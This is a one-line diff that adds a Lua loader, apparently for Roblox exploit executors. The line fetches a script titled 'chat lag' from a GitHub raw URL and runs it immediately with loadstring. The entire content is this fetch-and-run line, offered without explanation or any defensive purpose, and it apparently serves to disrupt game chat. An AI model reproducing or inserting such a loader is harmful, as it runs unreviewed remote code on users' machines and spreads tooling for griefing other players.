@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DRB7HS/3MK/refs/heads/main/chat%20lag"))()
